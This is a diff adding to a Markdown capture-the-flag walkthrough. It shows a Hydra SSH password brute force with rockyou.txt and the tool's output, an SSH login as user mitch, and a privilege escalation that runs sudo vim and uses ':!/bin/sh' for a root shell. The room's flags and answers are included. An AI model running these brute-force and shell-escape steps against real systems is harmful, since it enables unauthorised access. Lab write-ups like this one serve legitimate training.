@@ -54,4 +54,55 @@
       we see name file == ForMitch.txt  💡 Point - The data in file it is Massage Directed to a person : The Name Person🕵 mitch 
      
     ```   
-            
+
+ ### Try Login SSH  :
+ 
+    ```
+     sudo hydra -l mitch -P rockyou.txt ssh://10.114.170.115:2222
+            Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws               and ethics anyway).
+              Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 18:41:15
+              [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+              [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+              [DATA] attacking ssh://10.114.170.115:2222/
+              [2222][ssh] host: 10.114.170.115   login: mitch   password: secret 🏳
+              1 of 1 target successfully completed, 1 valid password found
+              Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 18:41:28`**
+     ``` 
+  **What's the password? *[secret]*
+
+  **Where can you login with the details obtained?** *[SSH]* 
+
+  **What's the user flag?** *[G00d j0b, keep up!]*
+       
+    ```
+     ssh mitch@10.114.170.115   -p 2222    🔛 After Login Found File Flag 
+       $ ls 
+       $ user.txt 
+       $ cat user.txt 
+       $ G00d j0b, keep up!
+    ```
+  **Is there any other user in the home directory? What's its name?** *[sunbath]*
+
+     ```
+     cat /etc/passwd  ⚠ In Here Found Name user and Dir Home 
+     ```
+
+  ### privilege Escalation  
+  
+   **What can you leverage to spawn a privileged shell?** *[vim]*
+     
+     ```
+      sudo -l    ✋  If you want to get high permissions, just try this command, take the services that work with root permissions, and search GTFOBins
+        (root) NOPASSWD: /usr/bin/vim 
+         1- Access Shell root By Vim
+         2- Open Vim by sudo 
+         sudo /usr/bin/vim 
+         
+         3- in vim write 👉 :!/bin/sh
+     ```
+  **What's the root flag?** *[W3ll d0n3. You made it!]*
+
+
+
+                                                                 ```  ✍ Tesla    ```
+                                                                           👋
